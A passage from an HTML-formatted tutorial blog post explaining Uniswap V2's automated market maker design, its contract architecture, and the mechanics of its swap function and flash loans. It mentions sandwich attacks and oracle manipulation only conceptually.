&lt;p&gt;Uniswap is a DeFi app that enables traders to swap one token for another in a trustless manner. It was one of the early automated market makers for trading (though not the first).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Automated market makers&lt;&#x2F;strong&gt; are an alternative to an order book, which the reader is assumed to already be familiar with.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;how-amm-works&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#how-amm-works&quot; aria-label=&quot;Anchor link for: how-amm-works&quot;&gt;How AMM works?&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.notion.so&#x2F;AMM-b765f5f5aa484cd0a6651a3203b93be3?pvs=21&quot;&gt;AMM&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;An automated market maker holds two tokens (token X and token Y) in the pool (a smart contract). It allows anyone to withdraw token X from the pool, but they must deposit an amount of token Y such that the ‚Äùtotal‚Äù of assets in the pool does not decrease, where we consider the ‚Äútotal‚Äù to be the product of the amounts of the two assets.&lt;&#x2F;p&gt;
&lt;p&gt;Assets are provided to the pool by &lt;em&gt;&lt;strong&gt;liquidity providers&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;, who receive so-called &lt;strong&gt;LP tokens&lt;&#x2F;strong&gt; to represent their share of the pool. Liquidity provider balances are tracked in a manner similar to how &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;erc4626&quot;&gt;ERC 4626&lt;&#x2F;a&gt; works. The difference between an AMM and ERC 4626 is that ERC 4626 only supports one asset but an AMM has two tokens. Just like a vault, the liquidity providers‚Äô share of the pool stays the same, but the product X*Y gets larger, so their slice is larger.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;advantages-of-amms&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#advantages-of-amms&quot; aria-label=&quot;Anchor link for: advantages-of-amms&quot;&gt;Advantages of AMMs&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;AMMs do not have a bid-ask spread&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In an AMM, price discovery is automatic. It‚Äôs determined by the ratio of assets in the pool.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter3_1.webp&quot;&gt;
&lt;p&gt;There is no need to wait for a suitable ‚Äúbid‚Äù or ‚Äúask‚Äù order to show up. It always exists.&lt;&#x2F;p&gt;
&lt;p&gt;If there is a mismatch between the price in an AMM and another exchange, then a trader will &lt;strong&gt;arbitrage&lt;&#x2F;strong&gt; the difference, bringing the prices back into balance.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;AMMs doubled as an oracle&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Since the price of the assets is automatically determined, other smart contracts can use an AMM as a price oracle. However, AMM prices can be manipulated with flash loans, so safeguards need to be put in place when using AMMs in this manner. Nonetheless, it is valuable that price data is provided for free.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;AMMs are highly gas efficient compared to order books&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Order books requires a significant amount of bookkeeping (no pun intended). An AMM only needs to hold two tokens and transfer them according to simple rules. This makes them more efficient to implement.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;disadvantages-of-amms&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#disadvantages-of-amms&quot; aria-label=&quot;Anchor link for: disadvantages-of-amms&quot;&gt;Disadvantages of AMMs&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;There are two major drawbacks to automated market makers: 1) the price always moves and 2) impermanent loss for liquidity providers.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Even small orders move the price in AMMs&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A buy or sell order will generally encounter more &lt;strong&gt;slippage&lt;&#x2F;strong&gt; than in an order book model, and the mechanism of swapping invites sandwich attacks.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Sandwich attacks are largely unavoidable in AMMs&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Attacker‚Äôs first buy (front run): drives up price for victim&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Victim‚Äôs buy: drive up price even further&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Attacker‚Äôs sell: sell the first buy at a profit&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;strong&gt;Liquidity providers don‚Äôt have control over the price their assets are sold at&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Liquidity providers can only provide assets proportional to the current ratio of tokens in the pool.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Liquidity providers for AMMs may suffer from impermanent Loss&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter3_2.webp&quot;&gt;
&lt;p&gt;The missed out on gains are called ‚Äú&lt;strong&gt;impermanent loss&lt;&#x2F;strong&gt;.‚Äù In the table above, the impermanent loss is $810 = ($990 - $180).&lt;&#x2F;p&gt;
&lt;h1 id=&quot;architecture-of-uniswap-v2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#architecture-of-uniswap-v2&quot; aria-label=&quot;Anchor link for: architecture-of-uniswap-v2&quot;&gt;Architecture of Uniswap V2&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;The architecture of Uniswap V2 is surprisingly simple. At its core is the &lt;strong&gt;UniswapV2Pair&lt;&#x2F;strong&gt; contract that holds two ERC 20 tokens that traders can swap against, or liquidity providers can provide liquidity for. Every different possible &lt;strong&gt;UniswapV2Pair&lt;&#x2F;strong&gt; has a different UniswapV2Pair contract to manage it. If the desired  &lt;strong&gt;UniswapV2Pair&lt;&#x2F;strong&gt; contract does not exist, a new one can be permissionlessly created from the &lt;strong&gt;UniswapV2Factory&lt;&#x2F;strong&gt; contract. &lt;strong&gt;UniswapV2Pair&lt;&#x2F;strong&gt; contracts are also ERC 20 tokens (they inherit from ERC 20), and that token is used to track deposits similar to how ERC 4626 works.&lt;&#x2F;p&gt;
&lt;p&gt;Although advanced traders or smart contracts can interact directly with a &lt;strong&gt;pair&lt;&#x2F;strong&gt; contract, most users will interact with a &lt;strong&gt;pair&lt;&#x2F;strong&gt; through a &lt;strong&gt;router&lt;&#x2F;strong&gt; contract, which has several convenience functions such as trading between &lt;strong&gt;pairs&lt;&#x2F;strong&gt; in one transaction to create a ‚Äúsynthetic‚Äù pair if it doesn‚Äôt exist.&lt;&#x2F;p&gt;
&lt;p&gt;There‚Äôs really only &lt;strong&gt;three&lt;&#x2F;strong&gt; smart contracts at play in the Uniswap V2 system.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Factory:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-core&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Factory.sol&quot;&gt;github.com&#x2F;Uniswap&#x2F;v2-core&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Factory.sol&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Pair:&lt;&#x2F;strong&gt; (which inherits ERC20): &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-core&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Pair.sol&quot;&gt;github.com&#x2F;Uniswap&#x2F;v2-core&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Pair.sol&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Router:&lt;&#x2F;strong&gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-periphery&#x2F;tree&#x2F;master&#x2F;contracts&quot;&gt;github.com&#x2F;Uniswap&#x2F;v2-periphery&#x2F;tree&#x2F;master&#x2F;contracts&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;The core - periphery pattern&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Observe that the router contract above is in a repository called ‚Äú&lt;strong&gt;v2 periphery&lt;&#x2F;strong&gt;‚Äù and the pair is in the ‚Äú&lt;strong&gt;v2 core&lt;&#x2F;strong&gt;‚Äù repository. Uniswap V2 follows the ‚Äú&lt;strong&gt;core &#x2F; periphery&lt;&#x2F;strong&gt;‚Äù design pattern where the most essential logic is held in the core while the ‚Äúoptional‚Äù logic is held in the periphery.&lt;&#x2F;p&gt;
&lt;p&gt;The intent behind this is to have the core hold as little code as possible, which reduces the possibility of bugs in the core business logic.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-core&quot;&gt;Uniswap V2 Core&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;¬†are the essential Uniswap V2 smart contracts, consisting of:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-core&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2ERC20.sol&quot;&gt;UniswapV2ERC20.sol&lt;&#x2F;a&gt;,&lt;&#x2F;strong&gt; contract is responsible for handling the LP tokens. It is a basic ERC20 contract, so we will not go over this.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-core&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Pair.sol&quot;&gt;UniswapV2Pair.sol&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;, which implements core swapping and liquidity provision functionality&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-core&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Factory.sol&quot;&gt;UniswapV2Factory.sol&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;, which deploys¬†&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-core&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Pair.sol&quot;&gt;UniswapV2Pair.sol&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;¬†contracts for any ERC20 token&#x2F;ERC20 token pair&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-periphery&quot;&gt;Uniswap V2 Periphery&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;¬†is an initial set of helpers, including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-periphery&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Router01.sol&quot;&gt;A router contract&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;¬†that performs the safety checks needed for safely swapping, adding, and removing liquidity.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-periphery&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;UniswapV2Migrator.sol&quot;&gt;A migrator contract&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;¬†that can remove liquidity from Uniswap V1 and deposit it into Uniswap V2 in a single transaction.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-periphery&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;libraries&#x2F;UniswapV2Library.sol&quot;&gt;A library contract&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;¬†that can be used in the creation of other helper contracts.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-periphery&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;examples&#x2F;ExampleOracleSimple.sol&quot;&gt;An example oracle contract&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;¬†that creates a simple TWAP from Uniswap V2 cumulative prices.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;uniswap-v2-periphery&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;examples&#x2F;ExampleFlashSwap.sol&quot;&gt;An example flash swap contract&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;¬†that withdraws ERC20 tokens, executes arbitrary code, and then pays for them.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter3_3.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;How to locate a pool, given two token addresses&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Instead of accessing a mapping from token pairs to pool address, smart contracts calculate the address of the pool by predicting the &lt;code&gt;create2&lt;&#x2F;code&gt; address as a function of the token addresses and the factory address. Since there is no storage access, this is very gas efficient. Below is the helper function provided by &lt;strong&gt;UniswapV2Library&lt;&#x2F;strong&gt; for calculating the address of the &lt;strong&gt;Pair&lt;&#x2F;strong&gt; contract.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter3_4.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;Why not use clones&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;www.rareskills.io&#x2F;post&#x2F;eip-1167-minimal-proxy-standard-with-initialization-clone-pattern&quot;&gt;EIP 1167 clone&lt;&#x2F;a&gt; pattern is used to create a collection of similar contracts, so why not use that here?  Although the deployment would be cheaper, it would introduce an extra 2,600 gas per transaction due to the &lt;strong&gt;delegatecall&lt;&#x2F;strong&gt;. Since pools are intended to be used frequently, the cost savings from deployment would eventually be lost after a few hundred transactions, so it is worth deploying a pool as a new contract.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;chapter-4-uniswap-v2-swap-function&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chapter-4-uniswap-v2-swap-function&quot; aria-label=&quot;Anchor link for: chapter-4-uniswap-v2-swap-function&quot;&gt;&lt;strong&gt;Chapter - 4 :Uniswap V2 Swap Function&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Breaking Down the Uniswap V2 Swap Function.&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;UniswapV2Pair.sol#swap()&lt;&#x2F;strong&gt; : &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-core&#x2F;blob&#x2F;ee547b17853e71ed4e0101ccfd52e70d5acded58&#x2F;contracts&#x2F;UniswapV2Pair.sol#L159&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;Uniswap&#x2F;v2-core&#x2F;blob&#x2F;ee547b17853e71ed4e0101ccfd52e70d5acded58&#x2F;contracts&#x2F;UniswapV2Pair.sol#L159&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_1.webp&quot;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Line &lt;strong&gt;170-171&lt;&#x2F;strong&gt; directly transfers out the amount of tokens that the trader requested in the function arguments. &lt;strong&gt;There is no place inside the function where tokens are transferred in. But this does not mean we can just call swap and drain all the tokens we want to!&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The reason we can remove tokens right away is so that we can do &lt;strong&gt;flash loans&lt;&#x2F;strong&gt;. Of course, the require statement on line &lt;strong&gt;182&lt;&#x2F;strong&gt; (orange arrow) will require us to pay back the flash loan with interest.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;At the top of the function, there is a comment which says the function should be called from another smart contract which implements important safety checks. That means &lt;strong&gt;this function in particular is missing safety checks.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The &lt;strong&gt;variables &lt;code&gt;_reserve0&lt;&#x2F;code&gt; and &lt;code&gt;_reserve1&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; are read on lines &lt;strong&gt;161&lt;&#x2F;strong&gt;, &lt;strong&gt;176&lt;&#x2F;strong&gt;-&lt;strong&gt;177&lt;&#x2F;strong&gt;, and &lt;strong&gt;182&lt;&#x2F;strong&gt;, but they &lt;strong&gt;are not written to in this function&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_reserve0&lt;&#x2F;code&gt;: Reserves of token¬†&lt;code&gt;x&lt;&#x2F;code&gt;¬†prior to the swap.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_reserve1&lt;&#x2F;code&gt;: Reserves of token¬†&lt;code&gt;y&lt;&#x2F;code&gt;¬†prior to the swap.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Line &lt;strong&gt;182&lt;&#x2F;strong&gt; (orange arrow) does not strictly check if &lt;code&gt;X √ó Y = K&lt;&#x2F;code&gt;. It checks if &lt;code&gt;balance1Adjusted √ó balance2Adjusted ‚â• K&lt;&#x2F;code&gt;. &lt;strong&gt;This is the only require statement that does something ‚Äúinteresting.‚Äù&lt;&#x2F;strong&gt; The other require statements check that values aren‚Äôt zero or that you aren‚Äôt sending the tokens to their own contract address.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;balance0Adjusted&lt;&#x2F;code&gt;: Reserves of¬†&lt;strong&gt;x&lt;&#x2F;strong&gt;¬†after the trader sends tokensX to the pool minus 0.3% of the amount sent.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;balance1Adjusted&lt;&#x2F;code&gt;: Reserves of¬†&lt;strong&gt;y&lt;&#x2F;strong&gt;¬†after the tokensY are sent to the trader from the pool minus 0.3%.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;balance0&lt;&#x2F;code&gt; and &lt;code&gt;balance1&lt;&#x2F;code&gt; are directly read from the actual balance of the pair contract using ER20 balanceOf.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Line &lt;strong&gt;172&lt;&#x2F;strong&gt; (below the  yellow box) is only executed if data is non-empty, otherwise it is not executed&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;We can use Swap() function for :&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Flash Loan&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Swapping one token for other&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;flash-borrowing&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#flash-borrowing&quot; aria-label=&quot;Anchor link for: flash-borrowing&quot;&gt;Flash Borrowing&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Users do not have to use the swap function for trading tokens, it can be used purely as a flash loan.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_2.webp&quot;&gt;
&lt;p&gt;The borrowing contract simply requests the amount of tokens they wish to borrow (&lt;strong&gt;A&lt;&#x2F;strong&gt;) without collateral and they will be transferred to the contract (&lt;strong&gt;B&lt;&#x2F;strong&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;code&gt;data&lt;&#x2F;code&gt; that should be provided with the function call is passed in as a function argument (&lt;strong&gt;C&lt;&#x2F;strong&gt;), and this will be passed to a function that implements.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;IUniswapV2Callee&lt;&#x2F;strong&gt;. The function &lt;strong&gt;&lt;code&gt;uniswapV2Call&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; must pay back the flash loan plus the fee or the transaction will revert.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;swap&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#swap&quot; aria-label=&quot;Anchor link for: swap&quot;&gt;&lt;strong&gt;Swap&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;If a flash loan is not used, the &lt;strong&gt;incoming tokens must be sent as part of calling the swap function&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;It should be clear that &lt;strong&gt;only a smart contract is able to interact with a swap function&lt;&#x2F;strong&gt;, because an EOA cannot simultaneously &lt;strong&gt;send the incoming ERC20 tokens and call swap in one transaction&lt;&#x2F;strong&gt; without the aid of another smart contract.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;measuring-the-amount-of-incoming-tokens&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#measuring-the-amount-of-incoming-tokens&quot; aria-label=&quot;Anchor link for: measuring-the-amount-of-incoming-tokens&quot;&gt;&lt;strong&gt;Measuring the amount of incoming tokens&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The way Uniswap V2 ‚Äúmeasures‚Äù the amount of tokens sent in is done on line &lt;strong&gt;176&lt;&#x2F;strong&gt; and &lt;strong&gt;177.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_3.webp&quot;&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_reserve0&lt;&#x2F;code&gt; and &lt;code&gt;_reserve1&lt;&#x2F;code&gt; are not updated inside this function.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;They reflect the &lt;strong&gt;balance of the contract before the new set of tokens were sent in&lt;&#x2F;strong&gt; as part of the swap.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;One of two things can happen for each of the two tokens in the pair:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;The pool had a net increase in the amount of a particular token.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The pool had a net decrease (or no change) in the amount of a particular token.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;The way the code determines which situation happened with the following lines:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;uint amount0In = balance0 &amp;gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
&lt;&#x2F;span&gt;&lt;span&gt;uint amount1In = balance1 &amp;gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The above two lines were doing the following thing&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_4.png&quot;&gt;
&lt;p&gt;If it measures a net &lt;strong&gt;decrease&lt;&#x2F;strong&gt;, the ternary operator returns &lt;strong&gt;zero&lt;&#x2F;strong&gt;, otherwise it will measure the net &lt;strong&gt;gain&lt;&#x2F;strong&gt; of tokens in.&lt;&#x2F;p&gt;
&lt;p&gt;Simply,&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;If the a token (0 or 1) ************************************is sent, the amount in to corresponding token will be &lt;code&gt;amountXIn = balanceX - (_reserveX - amountXOut)&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;If no token is sent &lt;code&gt;amountXIn&lt;&#x2F;code&gt; will become &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;zero.&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;It is always the case that &lt;code&gt;_reserveX &amp;gt; amountXOut&lt;&#x2F;code&gt; because of the require statement on line &lt;strong&gt;162&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_5.png&quot;&gt;
&lt;h2 id=&quot;balancing-xy-k&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#balancing-xy-k&quot; aria-label=&quot;Anchor link for: balancing-xy-k&quot;&gt;Balancing XY = K&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Now that we know how many tokens the user sent in, let‚Äôs see how to enforce XY = K.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_6.webp&quot;&gt;
&lt;p&gt;Uniswap V2 charges a hardcoded &lt;strong&gt;0.3% per swap&lt;&#x2F;strong&gt;, which is why we see the numbers 1000 and 3 at play.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;reserve0&lt;&#x2F;code&gt; - Balance of token0 before swap&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;balance0&lt;&#x2F;code&gt; - Balance of token0 after swap&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;reserve1&lt;&#x2F;code&gt; - Balance of token1 before swap&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;balance1&lt;&#x2F;code&gt; - Balance of token1 after swap&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;balance0Adjusted&lt;&#x2F;code&gt; - Updated balance of token0(&lt;strong&gt;X&lt;&#x2F;strong&gt;) minus 0.3% fee.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;balance1Adjusted&lt;&#x2F;code&gt; - Updated balance of token1(&lt;strong&gt;Y)&lt;&#x2F;strong&gt; minus 0.3% fee.&lt;&#x2F;p&gt;
&lt;p&gt;The line &lt;strong&gt;182&lt;&#x2F;strong&gt; is checking the following condition.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_7.webp&quot;&gt;
&lt;p&gt;Particularly, doing this with fee.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;blog_img&#x2F;uniswap-v2-complete&#x2F;u2_chapter4_8.webp&quot;&gt;
&lt;p&gt;&lt;strong&gt;K is not really a constant&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Think about it this way, if someone donated tokens to the pool and changed the value of K&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
